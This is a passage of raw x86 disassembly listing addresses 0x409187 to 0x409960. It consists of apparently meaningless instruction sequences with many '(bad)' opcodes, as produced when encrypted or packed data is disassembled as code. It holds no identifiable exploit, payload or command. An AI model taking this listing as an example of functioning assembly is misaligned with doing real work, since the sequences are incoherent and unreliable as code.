  409187:	mov    al,ds:0x9341c4dd
  40918c:	dec    edx
  40918d:	je     0x40917f
  40918f:	xchg   ebp,eax
  409190:	cmp    ebx,DWORD PTR [edx-0x48]
  409193:	lds    ecx,FWORD PTR [esi+0x2935b69f]
  409199:	daa    
  40919a:	push   0x1a
  40919c:	lds    ebx,FWORD PTR [eax+0x3e4f2c80]
  4091a2:	int    0xab
  4091a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4091a5:	add    ebp,DWORD PTR [eax]
  4091a7:	ret    0x754
  4091aa:	adc    DWORD PTR [esi+eax*4],ecx
  4091ad:	pop    ebp
  4091ae:	inc    ecx
  4091af:	iret   
  4091b0:	in     al,0x56
  4091b2:	sbb    BYTE PTR [ecx-0x6c],ah
  4091b5:	adc    al,0xe7
  4091b7:	ja     0x409139
  4091b9:	mov    ch,0x24
  4091bb:	mov    esp,0x7ceb1c31
  4091c0:	adc    DWORD PTR [esi],ebx
  4091c2:	mov    dh,0x6d
  4091c4:	or     dl,BYTE PTR [edx]
  4091c6:	mov    esp,0x77732cb3
  4091cb:	mov    esp,0xbfa8f4b2
  4091d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4091d1:	(bad)
  4091d5:	daa    
  4091d6:	jbe    0x40921e
  4091d8:	or     bh,dh
  4091da:	xor    bh,ch
  4091dc:	mov    fs,WORD PTR [ecx+0x51]
  4091df:	or     DWORD PTR ds:0x3937a413,0x2310aac5
  4091e9:	cld    
  4091ea:	lock pop ecx
  4091ec:	stc    
  4091ed:	ror    DWORD PTR [esi-0x45073ee3],0xa3
  4091f4:	mov    ebx,0xdbabb3b6
  4091f9:	adc    eax,DWORD PTR [eax+0x6]
  4091fc:	xchg   ebp,eax
  4091fd:	or     DWORD PTR [esi+edx*4],esi
  409200:	pop    esp
  409201:	jmp    0x409210
  409203:	jnp    0x40927d
  409205:	jl     0x4091c5
  409207:	mov    ch,BYTE PTR [esi]
  409209:	mov    dh,0xe1
  40920b:	mov    dh,0x14
  40920d:	dec    edi
  40920e:	es loope 0x40926f
  409211:	out    0x5d,al
  409213:	retf   0xecb2
  409216:	dec    edx
  409217:	leave  
  409218:	cmp    DWORD PTR [eax],0xffffffc3
  40921b:	rol    ch,0xff
  40921e:	into   
  40921f:	mov    ds:0x467b075f,eax
  409224:	cmp    eax,0xfb6124a4
  409229:	sbb    ebp,ebx
  40922b:	es and al,0xca
  40922e:	les    ebp,FWORD PTR [edi-0x3d]
  409231:	inc    esi
  409232:	into   
  409233:	div    DWORD PTR [esi+0x2a]
  409236:	mov    ds:0x8cde1119,eax
  40923b:	dec    eax
  40923c:	xchg   DWORD PTR [edx+0x3311b073],ebx
  409242:	mov    cl,0xd1
  409244:	iret   
  409245:	pop    ss
  409246:	sbb    ebp,edi
  409248:	fisub  WORD PTR [ecx-0x309bad38]
  40924e:	mov    bl,BYTE PTR [ebx-0x4f]
  409251:	jmp    0x4091e4
  409253:	xlat   BYTE PTR ds:[ebx]
  409254:	call   0x64d6:0xb061aa21
  40925b:	inc    ecx
  40925c:	jbe    0x40926e
  40925e:	jl     0x40926d
  409260:	push   ss
  409261:	jmp    0x4092b9
  409263:	and    al,0x25
  409265:	dec    ebx
  409266:	inc    edx
  409267:	push   ebp
  409268:	and    al,0xbe
  40926a:	pop    ds
  40926b:	mov    dh,0x3a
  40926d:	bndstx [esi],bnd2
  409270:	pop    ds
  409271:	fisttp WORD PTR ds:0x9158c0df
  409277:	clc    
  409278:	outs   dx,DWORD PTR ds:[esi]
  409279:	aam    0xb2
  40927b:	mov    edi,0x70886502
  409280:	add    bh,dl
  409282:	sbb    dl,BYTE PTR [ebp-0x70a0f55b]
  409288:	outs   dx,BYTE PTR ds:[esi]
  409289:	test   DWORD PTR [edx-0x47da7fed],esi
  40928f:	cmp    al,0x3
  409291:	retf   0xfa5c
  409294:	ins    DWORD PTR es:[edi],dx
  409295:	pop    edx
  409296:	mov    ecx,0xdb31f644
  40929b:	clc    
  40929c:	xchg   edx,eax
  40929d:	cmpps  xmm3,XMMWORD PTR [edx+0x206d0f67],0xe7
  4092a5:	pop    edx
  4092a6:	jl     0x4092e1
  4092a8:	mov    eax,ds:0xe75ee220
  4092ad:	data16 or al,0x19
  4092b0:	mov    gs,edx
  4092b2:	(bad)  
  4092b3:	or     dl,BYTE PTR [eax-0x74]
  4092b6:	cmp    BYTE PTR [eax+0x6e673cdc],0xa1
  4092bd:	adc    cl,BYTE PTR [esi-0x78]
  4092c0:	fnstenv [eax]
  4092c2:	scas   eax,DWORD PTR es:[edi]
  4092c3:	cmc    
  4092c4:	sbb    BYTE PTR [ecx+esi*8+0x73],0xf4
  4092c9:	test   eax,0x6c561535
  4092ce:	sub    ah,BYTE PTR [esi-0x782c590b]
  4092d4:	cmp    eax,DWORD PTR [ebx-0x2958eaed]
  4092da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4092db:	xchg   edx,eax
  4092dc:	inc    esi
  4092dd:	jne    0x4092c0
  4092df:	dec    ebp
  4092e0:	and    BYTE PTR [edx],bl
  4092e2:	mov    BYTE PTR [ebx+0x44c6d715],bh
  4092e8:	add    ch,BYTE PTR [eax]
  4092ea:	add    dl,dl
  4092ec:	or     DWORD PTR ds:[edx-0x37],ebp
  4092f0:	jle    0x409328
  4092f2:	push   ebp
  4092f3:	loope  0x4092b5
  4092f5:	or     BYTE PTR [edi-0x40],0xc3
  4092f9:	pop    ds
  4092fa:	in     al,0xb3
  4092fc:	dec    ebx
  4092fd:	cmc    
  4092fe:	mov    al,0x64
  409300:	push   ds
  409301:	xchg   ebp,eax
  409302:	push   ds
  409303:	adc    DWORD PTR ds:0x72664b9e,esp
  409309:	bound  eax,QWORD PTR [eax]
  40930b:	aaa    
  40930c:	gs cmp eax,0x564b81ac
  409312:	dec    esp
  409313:	js     0x4092c6
  409315:	bound  edi,QWORD PTR [ebp-0x19828a00]
  40931b:	shl    BYTE PTR [ebx+0x1ee053e9],0xdc
  409322:	(bad)  
  409323:	and    dh,al
  409325:	ja     0x40934e
  409327:	sub    al,0x32
  409329:	rol    BYTE PTR [edi-0x1e],0x27
  40932d:	jmp    esp
  40932f:	js     0x40933a
  409331:	push   esp
  409332:	jb     0x40932e
  409334:	fsub   QWORD PTR [edi+0x30]
  409337:	dec    esi
  409338:	fwait
  409339:	dec    eax
  40933a:	push   ds
  40933b:	enter  0x606b,0xa8
  40933f:	xor    cl,BYTE PTR [ecx+ebx*1]
  409342:	mov    esi,0xc32cd336
  409347:	fld    QWORD PTR ds:0xe51b95c0
  40934d:	pop    es
  40934e:	in     al,0xb8
  409350:	test   BYTE PTR [ecx-0x2b28af6f],dh
  409356:	into   
  409357:	(bad)  
  409358:	mov    al,ds:0xf7b2e1fe
  40935d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40935e:	mov    edi,0xa49e9ee4
  409363:	jl     0x409361
  409365:	push   ecx
  409366:	mov    ds:0xce3e494,eax
  40936b:	mov    eax,ds:0xdacf444a
  409370:	scas   al,BYTE PTR es:[edi]
  409371:	jle    0x40932c
  409373:	pop    es
  409374:	xor    DWORD PTR [edi-0x4d],ebp
  409377:	stc    
  409378:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409379:	pop    ss
  40937a:	push   edi
  40937b:	jbe    0x409393
  40937d:	mov    ecx,0x21f237d9
  409382:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409383:	mov    eax,0xd5a9c84f
  409388:	lods   al,BYTE PTR ds:[esi]
  409389:	leave  
  40938a:	sub    DWORD PTR [esi-0x72],0xb1125667
  409391:	dec    edi
  409392:	sub    al,0xf2
  409394:	sbb    eax,0xb9fccc84
  409399:	aam    0x6a
  40939b:	ret    0x6912
  40939e:	mov    ecx,0x8834b1bc
  4093a3:	aam    0x25
  4093a5:	movd   mm4,DWORD PTR [ecx+0x47252a62]
  4093ac:	loopne 0x409395
  4093ae:	sahf   
  4093af:	outs   dx,DWORD PTR ds:[esi]
  4093b0:	(bad)  
  4093b1:	or     BYTE PTR [ecx],dh
  4093b3:	xchg   esi,eax
  4093b4:	sahf   
  4093b5:	loop   0x409420
  4093b7:	iret   
  4093b8:	in     al,dx
  4093b9:	jb     0x40939a
  4093bb:	daa    
  4093bc:	and    BYTE PTR [esi+0xa],cl
  4093bf:	aam    0x80
  4093c1:	(bad)  
  4093c2:	out    dx,eax
  4093c3:	outs   dx,BYTE PTR ds:[esi]
  4093c4:	dec    ecx
  4093c5:	aas    
  4093c6:	mov    edx,0x7c2e6e20
  4093cb:	daa    
  4093cc:	test   eax,0x8653f04b
  4093d1:	push   cs
  4093d2:	mov    edx,0xb3ce75e6
  4093d7:	and    BYTE PTR [edx-0x695f225a],dh
  4093dd:	rcl    BYTE PTR [esi+0x1abd9f24],0x4f
  4093e4:	jecxz  0x4093e5
  4093e6:	leave  
  4093e7:	pop    edi
  4093e8:	sbb    al,0xb0
  4093ea:	xchg   BYTE PTR [edx-0x34b13f3a],ch
  4093f0:	pop    esp
  4093f1:	inc    ebp
  4093f2:	arpl   WORD PTR [eax],di
  4093f4:	add    al,0x79
  4093f6:	jmp    0x4093fd
  4093f8:	imul   DWORD PTR [ebp-0x11]
  4093fb:	cmp    al,cl
  4093fd:	dec    eax
  4093fe:	mov    ch,0x60
  409400:	xchg   DWORD PTR [edi],esp
  409402:	mov    BYTE PTR [edi-0x38],al
  409405:	adc    BYTE PTR [esp+edx*4+0x3d],bh
  409409:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40940a:	xor    ebp,DWORD PTR [ecx-0x33]
  40940d:	in     eax,dx
  40940e:	mov    ah,BYTE PTR [ebx+0x6701eae9]
  409414:	fld    st(5)
  409416:	push   ebp
  409417:	leave  
  409418:	aam    0x15
  40941a:	mov    eax,0x17bf66e0
  40941f:	inc    edi
  409420:	jecxz  0x40940a
  409422:	and    edx,DWORD PTR [edi]
  409424:	pop    ecx
  409425:	dec    esp
  409426:	jns    0x4093ff
  409428:	mov    bl,0xd3
  40942a:	lods   al,BYTE PTR ds:[esi]
  40942b:	call   0xaf2d:0xa6a0f5dc
  409432:	sbb    cl,dh
  409434:	retf   0xc6cc
  409437:	pop    ebx
  409438:	mov    dh,dl
  40943a:	sub    al,0x72
  40943c:	mov    edx,0x6d28366
  409441:	cmp    al,0x5d
  409443:	lock out 0x45,eax
  409446:	stc    
  409447:	dec    esp
  409448:	inc    ebp
  409449:	xchg   esi,eax
  40944a:	mul    BYTE PTR [edi-0x240857a2]
  409450:	xor    DWORD PTR [ebp+0x64bbcab5],eax
  409456:	mov    ah,0x92
  409458:	sbb    edx,DWORD PTR ds:0xa78b4b8e
  40945e:	mov    eax,0x550731c3
  409463:	cld    
  409464:	cdq    
  409465:	ds retf 
  409467:	jne    0x409475
  409469:	xor    esi,eax
  40946b:	les    ecx,FWORD PTR [eax+0x24]
  40946e:	cmp    al,0xe9
  409470:	(bad)  
  409472:	imul   ebx,DWORD PTR [edi+0x47bfd389],0x7d
  409479:	mov    cl,0x25
  40947b:	icebp  
  40947c:	sahf   
  40947d:	jns    0x4094a9
  40947f:	mov    ss,WORD PTR [edi+0xe]
  409482:	test   BYTE PTR [ebx],al
  409484:	push   ecx
  409485:	and    DWORD PTR [edi+0x1e],esi
  409488:	out    dx,eax
  409489:	sub    BYTE PTR [ebx+0x55],ah
  40948c:	dec    esp
  40948d:	adc    ah,bh
  40948f:	iret   
  409490:	pop    esp
  409491:	sahf   
  409492:	js     0x40945b
  409494:	or     eax,0x22d6bca7
  409499:	jns    0x4094bf
  40949b:	aas    
  40949c:	icebp  
  40949d:	and    DWORD PTR [ecx],edx
  40949f:	mov    ch,ah
  4094a1:	ins    BYTE PTR es:[edi],dx
  4094a2:	sub    al,0x6
  4094a4:	jns    0x409454
  4094a6:	addr16 xchg esi,eax
  4094a8:	out    dx,eax
  4094a9:	mov    dh,0xa7
  4094ab:	rol    ebp,0x45
  4094ae:	test   DWORD PTR [edi],0xcebfbd57
  4094b4:	or     BYTE PTR [eax],ah
  4094b6:	xchg   ebx,eax
  4094b7:	ins    BYTE PTR es:[edi],dx
  4094b8:	bound  esi,QWORD PTR [esi]
  4094ba:	mov    ebp,0x3d5cbfdb
  4094bf:	imul   ecx,edi,0x1
  4094c2:	sub    eax,0xe2979446
  4094c7:	imul   ebp,DWORD PTR [ebp+0x79c67e98],0xffffffa6
  4094ce:	sub    DWORD PTR [edx+0x477b6f55],ebx
  4094d4:	sahf   
  4094d5:	push   ecx
  4094d6:	iret   
  4094d7:	pop    es
  4094d8:	push   edx
  4094d9:	stc    
  4094da:	pop    eax
  4094db:	pop    esp
  4094dc:	adc    bl,BYTE PTR [edi]
  4094de:	mov    al,0xf5
  4094e0:	jmp    0x409509
  4094e2:	pop    eax
  4094e3:	add    DWORD PTR [ecx+0x1],esp
  4094e6:	ds jo  0x40946a
  4094e9:	mov    ds:0x78d20ba6,eax
  4094ee:	xchg   ebp,eax
  4094ef:	mov    esi,0xaf0bc78d
  4094f4:	jae    0x4094c4
  4094f6:	xchg   DWORD PTR [edx+eax*2],esp
  4094f9:	pop    ebx
  4094fa:	sbb    esp,0xfd566bd4
  409500:	nop
  409501:	jmp    0xb7e94b36
  409506:	mov    ebp,0x320aa2bb
  40950b:	aam    0x3e
  40950d:	mov    edx,0x47dafb0e
  409512:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409513:	cmp    eax,DWORD PTR ds:0x24cd4143
  409519:	sbb    DWORD PTR [ebp+0x583687ec],esi
  40951f:	push   edi
  409520:	push   edx
  409521:	fst    DWORD PTR gs:[ebx]
  409524:	les    esp,FWORD PTR [esi]
  409526:	ja     0x409521
  409528:	push   esp
  409529:	and    ah,BYTE PTR [edx]
  40952b:	sub    al,bl
  40952d:	test   al,0x7e
  40952f:	and    al,0x81
  409531:	(bad)  
  409533:	rcl    DWORD PTR [eax],0x59
  409536:	loopne 0x409578
  409538:	fistp  QWORD PTR [ecx-0x52]
  40953b:	mov    esi,0x8220c1a9
  409540:	jne    0x4094e4
  409542:	leave  
  409543:	leave  
  409544:	rcl    DWORD PTR [esi+0x35],1
  409547:	add    DWORD PTR [esi+0x7074e904],ebx
  40954d:	out    0x1a,al
  40954f:	mov    eax,ds:0xdc31a37c
  409554:	(bad)  
  409555:	adc    dl,cl
  409557:	nop
  409558:	call   0x621d:0x6651ecd0
  40955f:	jl     0x4095b2
  409561:	mov    fs:0x73dd06ae,eax
  409567:	inc    edi
  409568:	arpl   bp,ax
  40956a:	xchg   ebp,eax
  40956b:	out    dx,al
  40956c:	jg     0x4094f9
  40956e:	jl     0x40953e
  409570:	std    
  409571:	retf   0x4170
  409574:	pop    ebp
  409575:	sbb    BYTE PTR [edx-0x64307fe0],dh
  40957b:	jns    0x409530
  40957d:	imul   edx,esi,0xaaed3f3a
  409583:	out    0xbf,eax
  409585:	ret    
  409586:	jo     0x4095ad
  409588:	fucomp st(0)
  40958a:	ins    DWORD PTR es:[edi],dx
  40958b:	loope  0x4095e9
  40958d:	les    ebp,FWORD PTR [edx]
  40958f:	sub    eax,0x3a337ec2
  409594:	push   eax
  409595:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409596:	fs (bad) 
  409598:	retf   0xaa14
  40959b:	lods   eax,DWORD PTR ds:[esi]
  40959c:	mov    al,ds:0x3ce3eee5
  4095a1:	push   cs
  4095a2:	cmp    eax,0x342dbfba
  4095a7:	repnz mov esp,0x84cbea2a
  4095ad:	cmp    DWORD PTR [ebp+0x63],ebp
  4095b0:	xchg   ebp,eax
  4095b1:	enter  0xa099,0xda
  4095b5:	mov    edx,0xd4bdd24b
  4095ba:	clc    
  4095bb:	or     edx,DWORD PTR [ecx+0x1684b50]
  4095c1:	add    BYTE PTR [ebx],ch
  4095c3:	cmp    esp,DWORD PTR [ebp-0x775df5bb]
  4095c9:	jae    0x40956a
  4095cb:	adc    ebp,esi
  4095cd:	(bad)  
  4095ce:	xchg   edi,eax
  4095cf:	sub    eax,0xfe69b68b
  4095d4:	dec    ebp
  4095d5:	push   esp
  4095d6:	and    ebp,ecx
  4095d8:	leave  
  4095d9:	daa    
  4095da:	jmp    DWORD PTR [edi]
  4095dc:	ret    0x85f9
  4095df:	loopne 0x409590
  4095e1:	test   BYTE PTR [ecx-0x12],cl
  4095e4:	into   
  4095e5:	(bad)  
  4095e6:	add    esp,DWORD PTR [edx+0x2c]
  4095e9:	jmp    0x8baf2c4d
  4095ee:	or     edi,DWORD PTR [ebp+0x76195e75]
  4095f4:	jnp    0x4095e7
  4095f6:	sbb    eax,0x655937ea
  4095fb:	outs   dx,BYTE PTR es:[esi]
  4095fd:	or     ah,al
  4095ff:	outs   dx,DWORD PTR ds:[esi]
  409600:	mov    al,BYTE PTR [ecx+0x6b]
  409603:	cmp    BYTE PTR [esi+0x2b],bh
  409606:	add    DWORD PTR [edx+0x6d5f5c63],0xffffff92
  40960d:	addr16 aam 0x3
  409610:	cmp    ebx,DWORD PTR [eax+0x24]
  409613:	fwait
  409614:	add    ebp,eax
  409616:	test   DWORD PTR [ecx],eax
  409618:	add    eax,0x2e283e98
  40961d:	mov    ds:0x3a63a8cf,eax
  409622:	addr16 aad 0x26
  409625:	add    dh,bh
  409627:	pop    ss
  409628:	cmp    ch,BYTE PTR [esp+ecx*2-0x66286392]
  40962f:	cs xchg edi,eax
  409631:	in     eax,0x91
  409633:	fwait
  409634:	(bad)  
  409635:	or     bh,al
  409637:	and    DWORD PTR [ebx+ebp*4+0x78],ecx
  40963b:	add    eax,0x85c46649
  409640:	inc    esp
  409641:	outs   dx,BYTE PTR ds:[esi]
  409642:	outs   dx,DWORD PTR ds:[esi]
  409643:	cmp    WORD PTR [ecx+0x3c],bx
  409647:	into   
  409648:	pop    ebx
  409649:	mov    bl,0x89
  40964b:	jle    0x40960c
  40964d:	or     ecx,DWORD PTR [ebp*8-0x1ea213fc]
  409654:	int    0xb8
  409656:	and    bh,BYTE PTR gs:[eax]
  409659:	scas   al,BYTE PTR es:[edi]
  40965a:	xor    DWORD PTR [ecx+0x6b496114],ebx
  409660:	sahf   
  409661:	jge    0x40960f
  409663:	data16 not BYTE PTR [ecx+0x9023035]
  40966a:	lods   eax,DWORD PTR ds:[esi]
  40966b:	test   al,0xa7
  40966d:	mov    WORD PTR [ebx],fs
  40966f:	mov    bl,BYTE PTR [esi-0x7b6690e1]
  409675:	cld    
  409676:	mov    eax,ds:0x7b7c9be2
  40967b:	div    DWORD PTR [esi-0x65a4a7a8]
  409681:	ficomp WORD PTR [eax]
  409683:	mov    dh,0x2c
  409685:	jmp    0x94ba7fd1
  40968a:	mov    DWORD PTR [ebp+0x51],esi
  40968d:	in     al,dx
  40968e:	loopne 0x4096e2
  409690:	ja     0x40967f
  409692:	fnsave [eax+edx*8-0x5a]
  409696:	sbb    eax,0x126a7203
  40969b:	call   0x1fd5bcfc
  4096a0:	(bad)  
  4096a1:	mov    esi,0xcbc57dfe
  4096a6:	lds    esi,FWORD PTR [ecx+0x3f]
  4096a9:	mov    ecx,0x47cd675e
  4096ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4096af:	jb     0x4096ee
  4096b1:	mov    ds:0xb0e8c833,al
  4096b6:	xchg   ecx,eax
  4096b7:	sar    BYTE PTR [edx+0x7a],cl
  4096ba:	ficomp WORD PTR [esi-0xf]
  4096bd:	clc    
  4096be:	dec    ebp
  4096bf:	sub    ebp,DWORD PTR [esi+0x8b23051]
  4096c5:	pusha  
  4096c6:	shr    BYTE PTR [edi],1
  4096c8:	add    DWORD PTR [esi+0x1e],0xffffff8f
  4096cc:	jecxz  0x409673
  4096ce:	sbb    bl,BYTE PTR [esi+0x43]
  4096d1:	add    edx,DWORD PTR [esi-0x20648461]
  4096d7:	jl     0x409717
  4096d9:	add    ecx,DWORD PTR [esi+0x131c97d]
  4096df:	leave  
  4096e0:	or     DWORD PTR [edi-0x19ef55a7],esp
  4096e6:	xchg   edi,eax
  4096e7:	xchg   ebp,eax
  4096e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4096e9:	aas    
  4096ea:	ins    BYTE PTR es:[edi],dx
  4096eb:	cmp    dl,BYTE PTR [edi+0x390bc4fe]
  4096f1:	nop
  4096f2:	mov    ds:0x1794ae67,eax
  4096f7:	or     ecx,DWORD PTR [edx-0x63450917]
  4096fd:	bound  ecx,QWORD PTR [ebp-0x60a6843f]
  409703:	pop    edi
  409704:	sub    al,0x45
  409706:	push   edx
  409707:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409708:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409709:	cmp    eax,0xc8e5d4e7
  40970e:	mov    edx,0xfcb32ac9
  409713:	mov    esi,0xec3dfbf4
  409718:	sbb    ebx,DWORD PTR [edx+ebx*8+0x67]
  40971c:	sub    bl,bl
  40971e:	pop    ecx
  40971f:	push   edi
  409720:	add    DWORD PTR [ebx],edx
  409722:	cli    
  409723:	aad    0xfa
  409725:	fstp   QWORD PTR [ecx]
  409727:	scas   eax,DWORD PTR es:[edi]
  409728:	and    BYTE PTR [ebp-0x3d],bh
  40972b:	sub    edx,DWORD PTR [eax+ebp*8-0xc]
  40972f:	aad    0x57
  409731:	and    DWORD PTR [eax-0x5c],0x2b
  409735:	pop    edx
  409736:	add    al,0x60
  409738:	add    dl,BYTE PTR [ebp+0x41]
  40973b:	test   eax,0xead729cd
  409740:	sub    eax,0x314e8853
  409745:	jle    0x4096e8
  409747:	popa   
  409748:	xchg   edi,eax
  409749:	mov    ds:0xbef3955b,eax
  40974e:	aas    
  40974f:	in     eax,dx
  409750:	pinsrw mm3,WORD PTR ds:0x8b5dc56a,0xc3
  409758:	xchg   BYTE PTR [ecx-0x6f878383],dh
  40975e:	hlt    
  40975f:	mov    BYTE PTR [esi-0x13],cl
  409762:	add    al,0x50
  409764:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409765:	adc    DWORD PTR [esi-0x70],ebp
  409768:	xlat   BYTE PTR ds:[ebx]
  409769:	pop    ebp
  40976a:	sbb    al,0xb
  40976c:	dec    ebx
  40976d:	daa    
  40976e:	ins    DWORD PTR es:[edi],dx
  40976f:	dec    esp
  409770:	inc    eax
  409771:	and    al,0x26
  409773:	lahf   
  409774:	xchg   BYTE PTR [esi],ch
  409776:	push   0x57
  409778:	imul   DWORD PTR [eax]
  40977a:	fist   WORD PTR [esi+edi*4+0x6a53a79a]
  409781:	sbb    edi,esi
  409783:	inc    edx
  409784:	inc    ebx
  409785:	cmp    DWORD PTR [ecx+0x53],ebp
  409788:	pop    esi
  409789:	mov    eax,0x7458e04f
  40978e:	add    al,0x5d
  409790:	ds sbb eax,DWORD PTR ss:[edx]
  409794:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409795:	push   ebx
  409796:	ins    BYTE PTR es:[edi],dx
  409797:	cmc    
  409798:	imul   esp,DWORD PTR [eax-0x78],0x70
  40979c:	mov    dl,0x5
  40979e:	out    dx,al
  40979f:	push   ecx
  4097a0:	leave  
  4097a1:	fstp   st(2)
  4097a3:	(bad)  
  4097a5:	(bad)  
  4097a6:	mov    ah,0xca
  4097a8:	add    DWORD PTR [edi+0x63],0x6a52b2ce
  4097af:	in     al,0x81
  4097b1:	mov    eax,0xc6ef1519
  4097b6:	dec    esp
  4097b7:	dec    esi
  4097b8:	push   esi
  4097b9:	pop    ss
  4097ba:	aam    0xd2
  4097bc:	cmc    
  4097bd:	mov    esp,0x75025048
  4097c2:	push   esp
  4097c3:	and    BYTE PTR [eax+0x7],cl
  4097c6:	(bad)  
  4097c8:	sub    dl,BYTE PTR [edx-0x536d3d65]
  4097ce:	jno    0x409791
  4097d0:	shl    DWORD PTR [ebp+eiz*8+0x3],1
  4097d4:	je     0x4097fa
  4097d6:	imul   DWORD PTR [eax-0x1f]
  4097d9:	pop    ds
  4097da:	enter  0xcfa9,0xf8
  4097de:	jne    0x40985c
  4097e0:	cmp    al,0xe
  4097e2:	sbb    ebx,DWORD PTR [ecx]
  4097e4:	adc    al,0x57
  4097e6:	xchg   edx,eax
  4097e7:	sub    ebx,DWORD PTR [edx-0x316a3c9a]
  4097ed:	je     0x409789
  4097ef:	call   0xb729e71f
  4097f4:	push   esp
  4097f5:	pop    ecx
  4097f6:	fisub  WORD PTR [ebp+0x53fcfcf1]
  4097fc:	mov    ecx,0x6f029998
  409801:	jno    0x4097f5
  409803:	pop    esp
  409804:	or     DWORD PTR [eax+0x57a70398],edi
  40980a:	fdivr  QWORD PTR [ebp-0x63433859]
  409810:	and    eax,DWORD PTR [edi+eax*2-0x32]
  409814:	fdivr  QWORD PTR ds:0x6b0ba5a3
  40981a:	pop    ds
  40981b:	fs jae 0x4097fe
  40981e:	rcr    BYTE PTR [ecx-0x5b7fe68e],cl
  409824:	cmp    BYTE PTR [ecx+ebp*8+0x50],0x2b
  409829:	sub    edi,DWORD PTR [eax-0x20]
  40982c:	cmp    ecx,DWORD PTR [ebx]
  40982e:	in     al,dx
  40982f:	mov    eax,0x53b1b8a8
  409834:	fist   WORD PTR [edx+0x1b]
  409837:	icebp  
  409838:	jns    0x4097c3
  40983a:	mov    ds:0x72af11d3,al
  40983f:	xor    dh,BYTE PTR [eax+0x5a]
  409842:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409843:	fld    DWORD PTR [esi]
  409845:	ret    
  409846:	js     0x4097ed
  409848:	and    BYTE PTR [edx],dh
  40984a:	stc    
  40984b:	lods   al,BYTE PTR ds:[esi]
  40984c:	stos   BYTE PTR es:[edi],al
  40984d:	ja     0x409891
  40984f:	mov    al,0x53
  409851:	fwait
  409852:	lods   eax,DWORD PTR ds:[esi]
  409853:	sbb    BYTE PTR [ebp-0x15],0xe8
  409857:	out    0x20,eax
  409859:	outs   dx,BYTE PTR ds:[esi]
  40985a:	lahf   
  40985b:	adc    eax,0x7677429d
  409860:	xor    ebp,edi
  409862:	xchg   BYTE PTR [eax+0x11],dh
  409865:	rcr    BYTE PTR [ebx+esi*2-0x6f],0x66
  40986a:	jp     0x40988f
  40986c:	xchg   ecx,eax
  40986d:	push   esi
  40986e:	test   eax,0xdd935ef4
  409873:	inc    esp
  409874:	das    
  409875:	imul   edx,DWORD PTR [ecx+ebp*1+0x2e345365],0xffffffed
  40987d:	add    eax,0x1b68736f
  409882:	mov    cl,0x7
  409884:	(bad)  ds:0xe7d7f4b5
  40988a:	movq   mm7,mm4
  40988d:	ss mov esp,0x978d4b7f
  409893:	fdivr  QWORD PTR [esi-0x3d3de53f]
  409899:	mov    ?,edi
  40989b:	lock js 0x40987e
  40989e:	dec    esi
  40989f:	push   edi
  4098a0:	pop    ss
  4098a1:	sbb    esp,DWORD PTR [esi]
  4098a3:	inc    ecx
  4098a4:	pop    ebx
  4098a5:	(bad)  
  4098a6:	push   esp
  4098a7:	add    BYTE PTR [ebx],dh
  4098a9:	je     0x4098a5
  4098ab:	sub    edi,edi
  4098ad:	fild   QWORD PTR [edi+0x19]
  4098b0:	int    0x83
  4098b2:	aam    0x3
  4098b4:	loope  0x4098a5
  4098b6:	out    0xb0,eax
  4098b8:	cld    
  4098b9:	int    0x41
  4098bb:	xor    ecx,eax
  4098bd:	jmp    0x45d8:0xd8ae9570
  4098c4:	pop    esi
  4098c5:	ja     0x409872
  4098c7:	dec    eax
  4098c8:	les    esp,FWORD PTR [esi+0x25]
  4098cb:	pop    eax
  4098cc:	inc    esp
  4098cd:	fs inc esi
  4098cf:	mov    WORD PTR [eax+0xb6394ad],ss
  4098d5:	mov    ss,WORD PTR [esi-0x80]
  4098d8:	push   esi
  4098d9:	imul   ebx,DWORD PTR [ecx-0x62],0xffffffec
  4098dd:	popf   
  4098de:	sbb    al,0x2f
  4098e0:	sub    bh,BYTE PTR [eax+ecx*1+0x4b]
  4098e4:	int    0x97
  4098e6:	icebp  
  4098e7:	push   cs
  4098e8:	mov    BYTE PTR [ebx*2+0x2865dbd9],0x9
  4098f0:	test   BYTE PTR [esi+0x63c1e936],dl
  4098f6:	cld    
  4098f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4098f8:	sahf   
  4098f9:	shl    BYTE PTR [ecx-0x55e644ef],cl
  4098ff:	adc    DWORD PTR [ebp+0x5441509],ebp
  409905:	les    edi,FWORD PTR [esi-0x1d6166f3]
  40990b:	xchg   BYTE PTR [edx],bl
  40990d:	out    dx,al
  40990e:	fcomip st,st(1)
  409910:	fsubr  st,st(6)
  409912:	inc    edi
  409913:	mov    ds,WORD PTR [esi]
  409915:	pop    ecx
  409916:	aam    0x16
  409918:	aas    
  409919:	mov    ecx,0x3bca4262
  40991e:	jnp    0x40998f
  409920:	fcomp  DWORD PTR [ebp+0x281c153d]
  409926:	in     eax,dx
  409927:	dec    esi
  409928:	ficom  WORD PTR [ecx+0x39929b8a]
  40992e:	pushf  
  40992f:	jbe    0x40992f
  409931:	or     bh,BYTE PTR [edx]
  409933:	fist   DWORD PTR [ebx+0x1d5e1604]
  409939:	sub    al,0x91
  40993b:	dec    ebp
  40993c:	popf   
  40993d:	cmp    bh,BYTE PTR [ebp-0x32]
  409940:	ror    ebx,1
  409942:	cs jns 0x409905
  409945:	stc    
  409946:	repnz sahf 
  409948:	test   al,0xfc
  40994a:	or     dh,BYTE PTR [eax]
  40994c:	sbb    al,0x23
  40994e:	ss add al,0x95
  409951:	imul   esp,DWORD PTR [esi+0x46],0xffffffdc
  409955:	mov    eax,esi
  409957:	add    BYTE PTR [edi],0xe4
  40995a:	retf   
  40995b:	sbb    esp,0xfffffffd
  40995e:	cli    
  40995f:	push   es
  409960:	sub    ecx,DWORD PTR [esi-0x3]
